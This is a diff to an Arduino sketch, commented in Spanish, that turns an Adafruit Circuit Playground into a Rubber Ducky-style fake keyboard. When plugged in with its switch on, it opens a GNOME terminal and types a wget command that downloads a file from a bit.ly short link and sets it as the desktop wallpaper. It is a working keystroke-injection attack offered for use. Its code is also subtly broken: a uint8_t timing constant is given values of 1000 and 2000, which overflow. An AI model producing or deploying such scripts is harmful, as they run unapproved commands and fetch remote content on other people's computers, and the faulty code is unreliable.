@@ -1,3 +1,4 @@
+
 // Playground Ducky
 //
 // Inspirado en el funcionamiento del Rubber Ducky, se utiliza un Adafruit Circuit Playground
@@ -12,7 +13,7 @@
 
 // Si su interface grafica es muy lenta,
 // haga este numero mas grande y *pruebe de nuevo*
-const uint8_t slow_multiplier = 1000;
+const uint8_t slow_multiplier = 2000;
 
 // Necesitamos saber *antes* el layout de teclado
 #define KEYB_US
@@ -31,11 +32,16 @@ void setup() {
   if (CircuitPlayground.slideSwitch()) {
     Keyboard.begin();          // Iniciamos funcionalidad de teclado
     delay(2 * slow_multiplier);               // Esperamos un segundo a que el equipo nos registre como teclado
-    Keyboard.write(0x83);      // Caracter de "KEY_LEFT_GUI"
+    Keyboard.press(KEY_LEFT_ALT);      // Caracter de "KEY_LEFT_GUI"
+    delay(1000);
+    Keyboard.press(KEY_F2);
+    delay(1000);
+    Keyboard.release(KEY_LEFT_ALT);
+    Keyboard.release(KEY_F2);
     delay(1.3 * slow_multiplier);               // Algunos basados en Gnome se toman su tiempo
-    Keyboard.write(0xB0);      // Enter nos lleva a escribir
+    //Keyboard.write(0xB0);      // Enter nos lleva a escribir
     delay(1 * slow_multiplier);
-    Keyboard.print("terminal");// Abrimos una terminal
+    Keyboard.print("gnome-terminal");// Abrimos una terminal
     Keyboard.write(0xB0);      // Y damos enter
     delay(2 * slow_multiplier);
     Keyboard.print("wget -O tele.jpg http://bit.ly/2c7nVwO && gsettings set org.gnome.desktop.background picture-uri file://$(pwd)/tele.jpg && exit");
